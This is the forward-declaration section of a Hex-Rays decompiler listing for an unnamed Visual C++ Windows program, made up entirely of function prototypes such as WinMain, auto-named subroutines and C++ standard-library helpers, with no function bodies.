/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int sub_401000();
int sub_40100C();
int sub_401018();
int sub_401024();
int sub_401059();
int sub_401065();
int sub_401071();
int sub_40107D();
int sub_401098();
int sub_4010A4();
int sub_4010B0();
int sub_4010BC();
int sub_4010C8();
int sub_4010D4();
int sub_4010E0();
int sub_4010F1();
int sub_4010FD();
int sub_401109();
int sub_401115();
int sub_40113B();
int sub_401147();
int sub_401153();
int sub_40115F();
int sub_40116B();
int sub_401177();
int sub_401183();
int sub_40118F();
int sub_40119B();
int sub_4011C1();
int sub_4011CD();
int sub_4011D9();
int sub_4011E5();
int sub_4011F1();
int sub_4011FD();
int sub_401209();
int sub_401215();
int sub_401221();
int sub_401247();
int sub_401253();
int sub_401264();
int sub_40128A();
int sub_401296();
int sub_4012A2();
int sub_4012AE();
int sub_4012BA();
int sub_4012C6();
int sub_4012D2();
int sub_4012DE();
int sub_4012EA();
int sub_4012F6();
int sub_401302();
int sub_40130E();
int sub_40131A();
int sub_401326();
int sub_401332();
int sub_40133E();
int sub_40134A();
int sub_401360();
void *sub_4013B9();
int sub_4013C3();
int sub_4013D9();
int sub_4013E5();
int sub_4013F1();
int sub_40144A();
int sub_401468();
void *sub_40147E();
int sub_401488();
int sub_40149E();
int sub_401523();
int sub_401539();
int sub_401545();
int sub_40155B();
FILE *sub_401567();
uintptr_t sub_401575();
void sub_401580();
int __thiscall sub_401590(LPCRITICAL_SECTION lpCriticalSection); // idb
// int __cdecl wmemcmp(const wchar_t *S1, const wchar_t *S2, size_t N);
// wchar_t *__cdecl wmemset(wchar_t *S, wchar_t C, size_t N);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct std::exception *); idb
// int __thiscall unknown_libname_1(_DWORD); weak
const char *__thiscall sub_401654(_DWORD *this);
_DWORD *__thiscall sub_40168F(_DWORD *this);
void __noreturn sub_4016A7(void); // weak
std::exception *__thiscall sub_4016C4(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_4016DF(std::exception *this, struct std::exception *a2);
unsigned int *__stdcall sub_40171E(unsigned int *a1);
int sub_401841();
LPSTR *sub_401AC0();
int __thiscall sub_401B42(int this);
char *__thiscall sub_401B65(int *this, _DWORD *Src);
void **__thiscall sub_401B9B(_DWORD *this, void **a2, unsigned int a3, unsigned int a4);
// int __stdcall std::wstring::resize(int, wchar_t C); idb
void **__thiscall sub_401C17(void **this, void *a2);
void **__thiscall sub_401C3E(void **this, void **Src);
void __thiscall j_unknown_libname_3(void *); // idb
// _DWORD __stdcall std::wstring::wstring(_DWORD); weak
int __thiscall sub_401C9F(int this, void *Src);
// int __stdcall std::string::resize(int, int Val); idb
int __thiscall sub_401CF5(_DWORD *this);
// int __thiscall unknown_libname_3(_DWORD); weak
void **__thiscall sub_401D77(void **this, __int16 a2);
void **__thiscall sub_401DB6(void **this, void *Src);
void **__thiscall sub_401DDD(void **this, void *Src, unsigned int a3);
void **__thiscall sub_401E2B(void **Src, char *N, wchar_t C);
// int __stdcall unknown_libname_4(void *, void *Src, int, size_t N, wchar_t C); idb
// int __stdcall std::wstring::append(void *); idb
unsigned int __thiscall sub_401EE0(_DWORD *this, _DWORD *Src);
// _DWORD __stdcall std::wstring::_Move_assign(_DWORD, _DWORD); weak
// int __thiscall unknown_libname_5(_DWORD); weak
void **__thiscall sub_401F9A(void **Src, size_t Size, char Val);
int __stdcall sub_401FF5(int a1, int a2);
int __stdcall sub_402012(void *Block, int a2); // idb
void **__thiscall sub_402028(void **Src, void *Srca, int a3);
// _DWORD __stdcall std::allocator<wchar_t>::allocate(_DWORD); weak
void __noreturn sub_4020A6(void); // weak
char __fastcall sub_4020B1(wchar_t *S1, wchar_t *S2);
char *__thiscall sub_4020F2(int *this, int a2, _DWORD *Src);
unsigned int __thiscall sub_4021D5(unsigned int *this, char *Src, char *a3, int a4);
void **__thiscall sub_402267(void **Src, int a2, int a3, __int16 a4);
int __thiscall sub_402328(int this, unsigned int a2, int a3, void *Src);
void **__thiscall sub_4023A7(void **Src, unsigned int a2, int a3, size_t N, wchar_t C);
void **__thiscall sub_402438(void **Src, unsigned int a2, int a3, size_t a4, char Val);
// int __cdecl std::_Deallocate<8,0>(void *Block, unsigned int); idb
void **__thiscall sub_40251F(void **Src, unsigned int a2, int a3, void *Srca, void *a5);
// int __cdecl std::_Allocate<8,std::_Default_allocate_traits,0>(size_t Size); idb
int __thiscall sub_40262C(int *this);
int __fastcall sub_402653(int *a1, int a2, size_t Size);
void __fastcall __noreturn sub_402682(_DWORD, _DWORD); // weak
int __thiscall sub_40268D(_DWORD *this, int a2, int a3, int a4);
unsigned int __thiscall sub_4026F0(_DWORD *this, unsigned int a2);
int __stdcall sub_40271B(int a1, int a2, int a3);
int __stdcall sub_402744(int a1, int a2, int a3);
int __stdcall sub_40276C(unsigned int a1);
void __noreturn sub_40278D(void); // weak
unsigned int __cdecl sub_402798(int a1, unsigned int a2, unsigned int a3);
unsigned int __cdecl sub_4027C9(int a1, unsigned int a2, unsigned int a3);
void __thiscall sub_402842(const void **this, unsigned int a2);
int __fastcall sub_402890(const void **a1, int a2, unsigned int a3, int a4);
int __thiscall sub_4028FA(int this, int a2, int a3, int a4);
unsigned int __thiscall sub_40292E(_DWORD *this, unsigned int a2);
int *__fastcall sub_402954(int *a1, int a2, int *Src);
_DWORD *__thiscall sub_40299C(_DWORD *this, char *Src);
_BYTE *__thiscall sub_402A03(void **this, char *a2, _BYTE *Src, _BYTE *a4, int a5);
unsigned int __fastcall sub_402B37(int *a1, int a2, unsigned int a3);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const char *const); idb
_DWORD *__thiscall sub_402BC1(_DWORD *this);
void __noreturn sub_402BD9(void); // weak
std::exception *__thiscall sub_402BF6(std::exception *this, struct std::exception *a2);
// int __cdecl std::_Check_C_return(int); idb
int __thiscall sub_402C32(_Thrd_t *this);
void *sub_402C5F();
char __thiscall sub_402CCE(_BYTE *this);
char __thiscall sub_402CD2(_BYTE *this, char a2);
int __thiscall sub_402D02(_DWORD *this);
_DWORD *__thiscall sub_402D23(_DWORD *Block, char a2);
_DWORD *__thiscall sub_402D5E(_DWORD *Block, char a2);
_DWORD *__thiscall sub_402D96(_DWORD *Block, char a2);
int __thiscall sub_402DB9(_DWORD *this);
std::exception *__thiscall sub_402E27(std::exception *this, char *a2);
std::exception *__thiscall sub_402E4B(std::exception *this, struct std::exception *a2);
// _DWORD __cdecl std::operator==(_DWORD, _DWORD); weak
int __thiscall sub_402E9F(void *this, int a2, int a3);
// int __cdecl std::make_error_code(_DWORD, _DWORD); weak
int __cdecl sub_402EFA(int a1, int a2, int a3, void *Src, int a5, int a6, int a7, int a8);
std::exception *__thiscall sub_402F75(std::exception *this, int a2, int a3, _DWORD *Src);
std::exception *__thiscall sub_402FFF(std::exception *this, int a2, int a3, void *Src);
std::exception *__thiscall sub_403060(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_40307B(std::exception *this, struct std::exception *a2);
const char *sub_4030A5();
const char *sub_4030E4();
_DWORD *__stdcall sub_4030EA(_DWORD *a1, int a2);
_DWORD *__thiscall sub_40312F(_DWORD *Block, char a2);
int __thiscall sub_403152(int this, char *Locale);
void __thiscall sub_4031C8(std::_Lockit *this);
// int __thiscall std::locale::id::operator unsigned int(_DWORD); weak
void __thiscall sub_40329E(volatile signed __int32 *this);
volatile signed __int32 *__thiscall sub_4032A3(volatile signed __int32 *this);
void __thiscall sub_4032B2(_DWORD *this);
// const char *__thiscall std::locale::c_str(std::locale *__hidden this); idb
// const struct std::locale::facet *__thiscall std::locale::_Getfacet(std::locale *__hidden this, unsigned int); idb
int __thiscall sub_40331F(void *this);
int sub_403324();
_DWORD *__thiscall sub_403328(_DWORD *this, int a2, int a3);
int __cdecl sub_40335B(_DWORD *Block, std::locale *a2);
// int std::ctype<char>::_Tidy(void); weak
_DWORD *__thiscall sub_4034BF(_DWORD *Block, char a2);
int __cdecl sub_4034ED(_DWORD *Block, std::locale *a2);
// _DWORD __stdcall std::ctype<wchar_t>::_Init(_DWORD); weak
unsigned __int16 *__thiscall sub_4035F1(void *this, int a2, unsigned __int16 *a3, unsigned __int16 *a4);
unsigned __int16 *__thiscall sub_40361F(void *this, int a2, unsigned __int16 *a3, unsigned __int16 *a4);
__int16 __thiscall sub_4036D5(int this, char a2);
__int16 __thiscall sub_403712(int this, char a2);
char __thiscall sub_40374E(int this, wchar_t a2, char a3);
char __thiscall sub_403787(int this, wchar_t a2, char a3);
std::exception *__thiscall sub_4037E7(std::exception *this, void *Src, int *a3);
int __thiscall sub_403814(_DWORD *this, char a2, char a3);
struct std::locale::_Locimp *__thiscall sub_40387E(_DWORD *this);
std::exception *__thiscall sub_4038E6(std::exception *this, struct std::exception *a2);
struct std::ios_base *__thiscall sub_403901(struct std::ios_base *this, char a2);
_DWORD *__thiscall sub_403955(_DWORD *Block, char a2);
char __stdcall sub_403978(int a1, int a2, int a3);
// int __cdecl std::_Fgetc<char>(int, FILE *Stream); idb
// int __cdecl std::_Fputc<char>(char, FILE *Stream); idb
// int __usercall sub_4039B7@<eax>(int a1@<ebx>, void **Src, int a3, int a4, int a5, int a6, unsigned int a7);
// int __usercall sub_403A82@<eax>(int a1@<esi>);
int sub_403C12();
// int __usercall sub_403C9A@<eax>(int a1@<edi>, int a2@<esi>);
// int __usercall sub_403D77@<eax>(int a1@<edi>, int a2@<esi>);
char sub_403E1C();
char sub_403F9D();
int sub_4041D1();
void __thiscall sub_404355(_DWORD *this);
int __thiscall sub_404396(_DWORD *this, std::locale *a2);
int __thiscall sub_4043B2(FILE **this);
_DWORD *__thiscall sub_40442B(int this, _DWORD *a2, __int64 a3, __int64 a4, int a5, int a6, int a7);
_DWORD *__thiscall sub_4044B0(int this, _DWORD *a2, fpos_t Position, int Origin, int a5);
unsigned __int64 __thiscall sub_404564(int this, unsigned __int8 *Src, __int64 a3);
int __thiscall sub_404649(int this, char *Buffer, __int64 a3);
int __thiscall sub_40475B(int this);
int __thiscall sub_4048CF(_DWORD **this);
int __thiscall sub_404909(int this, int a2);
int __thiscall sub_404988(int this, char *a2);
void __thiscall sub_404A8D(int this);
int __cdecl UserMathErrorFunction();
void *__thiscall sub_404AE0(void *this, int a2, int a3, int a4);
unsigned __int64 __thiscall sub_404B23(_DWORD **this, unsigned __int8 *Src, __int64 a3);
unsigned __int64 __thiscall sub_404BEA(_DWORD **this, _BYTE *a2, __int64 a3);
int __thiscall sub_404CB9(_DWORD **this);
int sub_404CDE();
__int64 sub_404CE2();
int __stdcall sub_404CE7(int a1);
_DWORD _guard_check_icall_nop(); // weak
void __thiscall sub_404CEE(_DWORD *this);
int __thiscall sub_404D0F(_DWORD *this);
char *__thiscall sub_404D52(void *this, _DWORD *a2);
_BYTE *__thiscall sub_404D86(_BYTE *this, int a2, __int64 a3);
void __thiscall sub_404E63(struct std::ios_base *this);
int __thiscall sub_404EAD(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_404EE7(_DWORD *this, unsigned int a2, unsigned int a3);
// int __stdcall unknown_libname_13(void *); idb
// int __stdcall std::string::append(void *); idb
// _DWORD __stdcall std::string::string(_DWORD); weak
_DWORD *__thiscall sub_404FA6(_DWORD *this, void *Src);
_DWORD *__thiscall sub_404FC9(_DWORD *this, _DWORD *Src);
void *__thiscall sub_404FE6(void *Block, char a2);
_DWORD *__thiscall sub_405008(_DWORD *Block, char a2);
// _DWORD __stdcall std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`scalar deleting destructor'(char); weak
char *__thiscall sub_405052(char *this, char a2);
struct std::ios_base *__thiscall sub_405077(struct std::ios_base *this, char a2);
void __thiscall sub_4050C4(char *this);
int __thiscall sub_405117(int **this);
int __thiscall sub_405156(int this, int a2);
unsigned int __stdcall sub_4051B9(int a1, int a2, int a3, unsigned int a4);
char sub_4051FA();
// _DWORD __stdcall std::fpos<_Mbstatet>::fpos<_Mbstatet>(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __thiscall std::filebuf::_Set_back(_DWORD); weak
// int __thiscall std::filebuf::_Reset_back(_DWORD); weak
int __thiscall sub_40527B(_DWORD *this, int a2);
bool __thiscall sub_4052A6(void *this);
int __thiscall sub_405326(int this, FILE *Stream, char **Base);
int __thiscall sub_4053A0(int this);
_DWORD *__thiscall sub_4053F4(_DWORD *this, char *a2, int a3, int a4, int a5);
unsigned __int8 __thiscall sub_4054F8(void **this, char a2);
// int __stdcall unknown_libname_15(void *Src); idb
void **__thiscall sub_405554(void **this, void *Src, size_t Size);
void **__thiscall sub_40559D(void **Src, void *Srca, size_t Size);
unsigned int __thiscall sub_4055F6(_DWORD *this, _DWORD *Src);
int __thiscall sub_40567B(int *this);
_DWORD *__thiscall sub_4056B3(_DWORD *this, int a2);
// int __thiscall unknown_libname_17(_DWORD); weak
_BYTE *__thiscall sub_405714(_BYTE *this);
int __thiscall sub_40577D(int *this);
_DWORD *__thiscall sub_4057DF(_DWORD *this, int a2, char a3, int a4);
int __thiscall sub_40584E(_DWORD *this, char a2, char a3);
_DWORD *__thiscall sub_40586C(_DWORD *this);
// int __thiscall std::ios::init(struct std::ios_base *, int, char); idb
char __thiscall sub_4058FC(_DWORD *this, int a2);
void *sub_40594A();
struct std::_Facet_base *__cdecl sub_405971(std::locale *a1);
int __fastcall sub_405A06(int a1, void **a2, void *a3);
int __fastcall sub_405A3F(int a1, _DWORD *a2, char *a3);
uintptr_t *__thiscall sub_405AB8(uintptr_t *this, int a2, int a3, _BYTE *a4);
struct std::_Facet_base *__cdecl sub_405B4E(std::locale *a1);
char *__thiscall sub_405BE3(void *this, _BYTE *Src, _DWORD *a3);
void **__thiscall sub_405CF8(void **this, int a2, int a3, char a4);
int __thiscall sub_405DA0(int this, size_t Size, int a3, void *Src);
void **__thiscall sub_405E0F(void **Src, unsigned int a2, int a3, void *Srca, size_t a5);
void __thiscall sub_405ED4(void **this);
int __thiscall sub_405EEF(_DWORD *this);
int __cdecl sub_405EFC(_DWORD *Block, std::locale *a2);
__int16 __thiscall sub_405F5E(_DWORD *this, int a2);
void **__thiscall sub_405FAE(void **this, unsigned int a2);
// int __stdcall std::_Immortalize_impl<std::_Iostream_error_category>(void *, void *, void **); idb
unsigned int __stdcall sub_406033(void (**a1)(void));
unsigned int __stdcall sub_406089(void (**Block)(void));
struct std::_Facet_base *__cdecl sub_4060C7(std::locale *a1);
void **__thiscall sub_40615C(void **Src, unsigned int a2, int a3);
// _DWORD __stdcall std::string::erase(_DWORD); weak
char *__thiscall sub_40621B(char *this, char a2);
int __stdcall sub_406223(char a1);
int __fastcall sub_40622B(void *a1, size_t Size, void *Src, size_t Sizea);
bool __thiscall sub_4062C6(char *this, int a2);
int __thiscall sub_4062E4(_DWORD *this);
_DWORD *__thiscall sub_406307(_DWORD *this, int a2, _DWORD *Src);
_DWORD *__thiscall sub_406351(_DWORD *this);
_DWORD *__thiscall sub_40635D(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40637F(_DWORD *this, _DWORD *Src);
_DWORD *__thiscall sub_4063A5(_DWORD *this, _DWORD *Src);
_DWORD *__thiscall sub_4063C6(_DWORD *this, _DWORD *Src);
_DWORD *__thiscall sub_4063E7(_DWORD *this, _DWORD *a2, int a3, int a4);
bool __cdecl sub_406577(void *Src, char *a2, int a3);
_DWORD *__thiscall sub_4065CF(_DWORD *Block, char a2);
std::exception *__thiscall sub_4065F1(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_40661F(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_40663E(std::exception *this, struct std::exception *a2);
void __noreturn sub_40668E(); // weak
std::exception *__thiscall sub_4066C7(std::exception *this, struct std::exception *a2);
int __stdcall sub_4066E6(int a1);
bool __thiscall sub_40670E(void *this, int a2);
int __thiscall sub_406723(void *this);
void __thiscall __noreturn sub_406728(void *this);
char sub_406775();
void __noreturn sub_406778(); // weak
int __thiscall sub_4067B1(int *this, int a2);
int __thiscall sub_4067CC(void *this, int a2, int a3, int a4);
int __thiscall sub_4067EC(int *this, int a2);
int __thiscall sub_406807(void *this, int a2, int a3, int a4);
int __thiscall sub_406827(void *this, int a2, int a3, int a4, int a5);
int __thiscall sub_40684A(void *this, int a2, int a3, int a4, int a5);
char *__thiscall sub_40686D(char *this);
int __stdcall sub_406871(_DWORD *a1);
int __thiscall sub_406880(void *this);
char __stdcall sub_406889(int a1);
int __thiscall sub_40688E(void *this);
int __thiscall sub_406893(void *this);
void __noreturn sub_40689B(); // weak
_DWORD *__thiscall sub_4068D4(_DWORD *this, _DWORD *Src);
int __thiscall sub_4068F5(void *this, int a2, int a3);
void __noreturn sub_40694B(); // weak
std::exception *__thiscall sub_406984(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_4069A3(std::exception *this, struct std::exception *a2);
int __thiscall sub_4069C2(void *this);
int __thiscall sub_4069D1(void *this);
int __thiscall sub_4069E0(void *this);
int sub_4069E9();
int __thiscall sub_4069ED(_BYTE *this);
BOOL __thiscall sub_4069FD(_BYTE *this);
int __stdcall sub_406A06(int a1, _DWORD *a2, int a3, int a4);
int __stdcall sub_406A19(int a1, int a2, int a3, int a4, int a5, int a6);
void __thiscall sub_406A1E(void *this); // idb
_DWORD *__thiscall sub_406A26(_DWORD *this, char *Src, char a3);
_DWORD *__thiscall sub_406A82(_DWORD *this, void *Src, int Size, char a4);
void *__thiscall sub_406AC9(_DWORD *this, void *Src, int Size, char a4);
_DWORD *__thiscall sub_406AFD(_DWORD *this, void *a2);
int __thiscall sub_406B9E(void **this);
_DWORD *__thiscall sub_406BFD(_DWORD *this, int a2);
void **__thiscall sub_406C56(void **Block, char a2);
std::exception *__thiscall sub_406C78(std::exception *this, struct std::exception *a2);
int __thiscall sub_406C9F(_DWORD **this);
int __thiscall sub_406CA7(_DWORD **this);
int __thiscall sub_406CAF(_DWORD **this);
int __thiscall sub_406CB7(_DWORD **this);
int __thiscall sub_406CC3(_DWORD **this);
int __thiscall sub_406CCF(_DWORD *this);
int __thiscall sub_406CDA(_DWORD *this);
_DWORD *__thiscall sub_406CDE(_DWORD *this);
int __thiscall sub_406D06(_DWORD *this, int a2);
void __thiscall sub_406D59(int this);
int __thiscall sub_406DA9(_DWORD *this);
int __thiscall sub_406DAD(_DWORD *this);
int __thiscall sub_406DB8(int this, void *Src, int a3);
int sub_406DDC();
_DWORD *__thiscall sub_406DE8(_DWORD *this, char *Src);
void *__thiscall sub_406E6D(void *Block, char a2);
void __thiscall sub_406E8A(int this);
int __thiscall sub_406EE5(void *this, char a2, int a3);
_DWORD *__thiscall sub_406F0A(_DWORD *this, char *Src, char a3, int a4);
_DWORD *__thiscall sub_406F92(_DWORD *this, void *Src, int Size, int a4, int a5);
_DWORD *__thiscall sub_40701C(_DWORD *Block, char a2);
void *__thiscall sub_407043(void *this, void *a2);
void *__thiscall sub_407086(void *this, void *a2);
int __thiscall sub_4070C9(void *this, int a2, int a3, int a4);
int __stdcall sub_4070DE(int a1, int a2, int a3, int a4, int a5, char a6);
char __stdcall sub_407104(int a1);
char __stdcall sub_407143(int a1);
char __stdcall sub_407155(int *a1);
_DWORD *__thiscall sub_407167(_DWORD *Block, char a2);
void *__thiscall sub_407198(int *this, void *a2);
char __thiscall sub_4071AE(_DWORD *this);
_DWORD *__thiscall sub_4071B9(_DWORD *Block, char a2);
char __thiscall sub_4071E4(_DWORD *this);
_DWORD *__thiscall sub_40720A(_DWORD *this, int a2, int a3, int a4);
void *__thiscall sub_4072B2(void *Block, char a2);
int __thiscall sub_4072D4(int this);
_DWORD *__thiscall sub_407324(_DWORD *this, int a2);
int *__thiscall sub_407355(int this);
// char __usercall sub_4075CF@<al>(int a1@<ecx>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
int __thiscall sub_407733(const void **this);
void __thiscall sub_40782F(int this, void *Src);
int __thiscall sub_4078A8(int *this);
int __thiscall sub_407A35(int *this, int a2);
char __thiscall sub_407A5E(const void **this, WCHAR *lpFileName);
// char __userpurge sub_407DF2@<al>(int a1@<ecx>, _DWORD *a2@<ebx>, int a3@<edi>, int a4@<esi>, int a5);
void *__thiscall sub_407F9E(int this);
int __stdcall sub_407FFF(int a1, int a2);
char __thiscall sub_408090(_DWORD *this, LPCWSTR lpString1);
char __stdcall sub_408112(int a1, int a2);
char __thiscall sub_408117(_DWORD *this, void *a2, void *a3);
char __thiscall sub_4081B0(_DWORD *this, LPCWSTR lpString1);
int __thiscall sub_4081F9(_DWORD *this);
int __stdcall sub_4082A8(int a1);
_DWORD *__thiscall sub_408326(void *this);
char *__thiscall sub_40836A(char *this);
int __thiscall sub_40836E(_DWORD *this);
int sub_408376();
int __thiscall sub_408384(_DWORD *this);
int __thiscall sub_408390(_DWORD *this);
int __stdcall sub_40839C(int a1);
char __fastcall sub_4083AF(int a1);
int __thiscall sub_408403(_DWORD *this);
int __thiscall sub_40840F(_DWORD *this);
_DWORD *sub_40841B();
_DWORD *sub_40842A();
int sub_408466();
int __thiscall sub_40846A(_DWORD *this);
_DWORD *__thiscall sub_408471(_DWORD **this);
__m128i *__thiscall sub_40847E(int **this, int *a2);
_DWORD *__thiscall sub_408495(void *this);
int __stdcall sub_4084C1(int a1);
int __thiscall sub_4084E9(_DWORD *this);
int sub_4084ED();
unsigned int __thiscall sub_4084F1(_DWORD *this);
int __thiscall sub_408536(_DWORD *this);
int __thiscall sub_408558(_DWORD *this);
int __thiscall sub_40856B(void *this, unsigned int a2);
int __thiscall sub_40858B(void *this, int a2);
int __thiscall sub_4085AB(_DWORD *this);
int __thiscall sub_4085B3(_DWORD *this);
bool __thiscall sub_4085BF(_DWORD *this);
int __thiscall sub_4085E1(int *this, int a2);
int __thiscall sub_408605(int *this, unsigned int *a2, int a3);
int __thiscall sub_40862C(_DWORD *this, int a2, int a3);
int __thiscall sub_408655(_DWORD *this);
_DWORD *__thiscall sub_408661(_DWORD *this, int a2);
int __thiscall sub_4086B6(_DWORD *this);
void __noreturn sub_4086CB(); // weak
int __thiscall sub_4086E8(_DWORD *this, void *a2, size_t Size, int a4, int a5);
int __thiscall sub_40872B(void *this, int a2);
_DWORD *__thiscall sub_408790(_DWORD *this, int a2);
char __thiscall sub_4087B7(void *this, int a2, int a3, int a4, int a5);
int __thiscall sub_408842(void *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_40885F(void *this, _DWORD *a2);
char __thiscall sub_40886F(int *this, void *Src, char *a3, _DWORD *a4);
_DWORD *__thiscall sub_4088BF(void *this, _DWORD *a2);
char __thiscall sub_4088CF(int *this, void *Src, char *a3, int *a4);
void __thiscall sub_40891D(int this);
void __thiscall sub_408954(int this);
void *__thiscall sub_40898B(int this, size_t Size);
void *__thiscall sub_4089B9(_DWORD *this, void *Src, size_t Size);
void __thiscall sub_4089EF(_DWORD *this);
_DWORD *__thiscall sub_408A33(_DWORD *this, size_t Size);
void *__thiscall sub_408A58(int this);
int sub_408A76();
int __stdcall sub_408A7A(int a1);
int __stdcall sub_408AA2(unsigned int a1);
int sub_408AB2();
int __thiscall sub_408AB6(_DWORD *this);
int __thiscall sub_408ABA(_DWORD *this, int a2);
void __noreturn sub_408AC7(); // weak
int __thiscall sub_408AE4(_Mtx_t *this);
void *__thiscall sub_408B17(void *Block, char a2);
_DWORD *__thiscall sub_408B44(_DWORD *this);
_DWORD *__fastcall sub_408B76(_DWORD *a1, int a2, int a3);
int __fastcall sub_408B9C(int a1, int a2, int a3);
_DWORD *__thiscall sub_408BF1(_DWORD *this);
_DWORD *__thiscall sub_408C19(_DWORD *this);
_DWORD *__thiscall sub_408C3C(_DWORD *this, int a2);
_DWORD *__thiscall sub_408CC4(_DWORD *this, int a2);
_DWORD *__thiscall sub_408CF9(_DWORD *this, int a2);
std::exception *__thiscall sub_408D1D(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_408D3C(_DWORD *Block, char a2);
std::exception *__thiscall sub_408D66(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_408D85(_DWORD *this, int a2);
_DWORD *__thiscall sub_408DC8(_DWORD *this, int a2);
_DWORD *__thiscall sub_408DF8(_DWORD *this, int a2);
_DWORD *__thiscall sub_408E24(_DWORD *this, int a2);
std::exception *__thiscall sub_408E4C(std::exception *this, struct std::exception *a2);
void *__thiscall sub_408E6B(void *Block, char a2);
_DWORD *__thiscall sub_408E90(_DWORD *Block, char a2);
_DWORD *__thiscall sub_408EBE(_DWORD *Block, char a2);
int __thiscall sub_408EE7(_DWORD *this);
void *__thiscall sub_408F2E(void *Block, char a2);
void **__thiscall sub_408F5E(void **Block, char a2);
void **__thiscall sub_408F8A(void **Block, char a2);
_DWORD *__thiscall sub_408FAC(_DWORD *this);
_DWORD *__thiscall sub_40900F(_DWORD *this);
int __cdecl sub_409072(int a1);
_DWORD *__thiscall sub_409102(_DWORD *this);
int __thiscall sub_409123(int this);
int __thiscall sub_409166(int this);
int __thiscall sub_409184(int this, int a2);
unsigned int __thiscall sub_4091D2(_DWORD *this);
void __stdcall sub_40921E(void *Block, int a2);
_DWORD *__thiscall sub_409247(_DWORD *this, int a2);
int __fastcall sub_409293(int a1, int a2, _DWORD *a3);
void *__fastcall sub_4092FE(int a1, int a2, void *a3, int a4);
int __cdecl sub_409325(unsigned int a1);
void __stdcall sub_409348(void *Block, int a2);
int __thiscall sub_409370(int *this, int a2);
// int __thiscall unknown_libname_19(void *); idb
void **__thiscall sub_4093D7(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_409419(_DWORD *this);
_DWORD *__thiscall sub_409462(_DWORD *this);
int __cdecl sub_40948A(int a1);
void *__thiscall sub_40954A(_DWORD *this, int a2);
int __fastcall sub_409587(int a1, int a2, unsigned int a3, int a4);
int __thiscall sub_4095B1(int this, unsigned int a2);
int __fastcall sub_4095DA(int a1, int a2, unsigned int a3);
int __cdecl sub_40960F(void *a1); // idb
int __cdecl sub_409630(int a1, char *Src, void *a3);
int __thiscall sub_40967A(_DWORD *this);
int __thiscall sub_4096AA(_DWORD *this, int a2);
char *__cdecl sub_4096C6(char *a1, int a2, int a3, char a4);
char *__cdecl sub_40970F(char *a1, int a2, _DWORD *a3, char a4);
int __thiscall sub_409758(int *this, int a2, int a3);
int __fastcall sub_4097F9(int a1, _DWORD *a2, _DWORD *a3);
int sub_40985F();
char *__fastcall sub_409919(_DWORD *a1, int a2, char *Src, char *a4);
void *__cdecl sub_4099B2(int a1, void *Block, unsigned int a3, size_t Size, char a5);
void **__thiscall sub_409A35(void **Src, unsigned int a2, int a3);
void **__thiscall sub_409AC0(int this, int a2, char *Src, size_t Size);
int __thiscall sub_409B59(int this, int a2, int a3, char a4);
int __thiscall sub_409BCC(int this, int a2, _DWORD *a3, char a4);
int __thiscall sub_409C38(int this, int a2, _DWORD *a3, char a4);
void **__thiscall sub_409CB2(void **Src, unsigned int a2, int a3, int a4, void *Srca, size_t Size);
_DWORD *__thiscall sub_409D57(void *this, _DWORD *a2);
char __thiscall sub_409D67(int *this, void *Src, char *a3, int *a4);
_DWORD *__thiscall sub_409DB8(_DWORD *this, int a2, int a3, char a4);
_DWORD *__thiscall sub_409E02(_DWORD *this, int a2, _DWORD *a3, char a4);
_DWORD *__thiscall sub_409E2D(_DWORD *this, int a2);
_DWORD *__thiscall sub_409E55(_DWORD *this, char a2);
int __thiscall sub_409E5D(_DWORD *this);
_DWORD *__thiscall sub_409E65(_DWORD *this, char a2);
void *__thiscall sub_409E6D(char *this, char a2);
_DWORD *__thiscall sub_409E75(_DWORD *this, char a2);
void *__thiscall sub_409E7D(char *this, char a2);
_DWORD *__thiscall sub_409E8D(_DWORD *this, char a2);
void *__thiscall sub_409E95(char *this, char a2);
_DWORD *__thiscall sub_409E9D(_DWORD *this, char a2);
_DWORD *__thiscall sub_409EA5(_DWORD *this, char a2);
int __thiscall sub_409EAD(_DWORD *this);
_DWORD *__thiscall sub_409EB5(_DWORD *this, char a2);
void __thiscall sub_409EBF(_DWORD *this, WCHAR *lpString);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
int __thiscall sub_40A028(DWORD dwProcessId); // idb
BOOL sub_40A189();
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter);
BOOL __thiscall sub_40A37A(LPWSTR lpCommandLine);
int __fastcall sub_40A3CD(LPCWSTR lpName, WCHAR *lpBuffer);
_DWORD *__fastcall sub_40A416(_DWORD *a1, unsigned int a2);
char __thiscall sub_40A458(int *this);
_DWORD *__thiscall sub_40A52A(_DWORD *this);
char *__thiscall sub_40A60A(_DWORD *this, char *a2, _DWORD *Src);
_DWORD *__stdcall sub_40A7AA(char *Src, char *a2, _DWORD *a3);
char __thiscall sub_40A80C(int this, int a2);
bool __thiscall sub_40A85E(HANDLE *this, DWORD dwMoveMethod);
bool __thiscall sub_40A887(HANDLE *this, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite);
bool __thiscall sub_40A8AC(HANDLE *this, LPVOID lpBuffer, DWORD nNumberOfBytesToRead);
BOOL __cdecl sub_40A8EA(int a1, int a2);
unsigned int __cdecl sub_40A926(_DWORD *a1);
int __cdecl sub_40A95A(unsigned int *a1);
BOOL __cdecl sub_40A9A7(_DWORD *a1);
int __cdecl sub_40A9BF(_DWORD *a1, _DWORD *a2);
int __cdecl sub_40A9DA(_DWORD *a1, _DWORD *a2);
int __cdecl sub_40AA0F(_DWORD *a1, _DWORD *a2);
